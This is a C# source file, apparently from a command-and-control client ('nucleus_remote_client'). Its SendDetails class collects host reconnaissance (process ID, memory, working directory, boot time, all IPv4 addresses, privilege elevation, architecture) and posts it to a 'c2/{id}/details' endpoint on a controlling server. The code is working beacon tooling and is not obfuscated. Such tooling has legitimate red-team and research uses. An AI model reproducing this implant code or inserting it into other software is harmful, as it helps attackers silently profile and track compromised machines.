using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http.Json;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using nucleus_remote_client.Lib;

namespace nucleus_remote_client.Client
{
    internal class SendDetails : IClient
    {
        public int Pid { get; set; }
        public string Cwd { get; set; }
        public DateTime SystemStartupTime { get; set; }

        private readonly string[] IpAddresses;

        public string Memory { get; set; }
        public TimeSpan ProcessorTime { get; set; }
        public TimeSpan RunTime { get; set; }
        public SendDetails()
        {
            var proc = Process.GetCurrentProcess();
            this.Pid = proc.Id;
            this.Memory = (proc.PrivateMemorySize64 / 1024.0 / 1024.0).ToString("0.00 Mb");
            this.ProcessorTime = proc.TotalProcessorTime;
            this.RunTime = DateTime.Now - proc.StartTime;
            this.Cwd = Environment.CurrentDirectory;
            this.SystemStartupTime = DateTime.Now.AddMilliseconds(-Environment.TickCount64);
            // Get all ip addresses
            this.IpAddresses = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
                .SelectMany(x => x.GetIPProperties().UnicastAddresses)
                .Where(x => x.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                .Select(x => x.Address.ToString())
                .ToArray();
        }

        public async Task<HttpResponseMessage?> ExecuteAsync(HostSettings hostSettings)
        {
            var client = ClientHelper.GetHttpClient(hostSettings);
            return await client.PostAsJsonAsync($"c2/{hostSettings.Id}/details", new
            {
                pid = this.Pid,
                memory = this.Memory,
                runTime = this.RunTime,
                processorTime = this.ProcessorTime,
                cwd = this.Cwd,
                this.SystemStartupTime,
                ipAddress = string.Join(", ", this.IpAddresses),
                elevated = Environment.IsPrivilegedProcess.ToString(),
                arch = Environment.Is64BitOperatingSystem ? "x64" : "x86",
            });
        }
    }
}
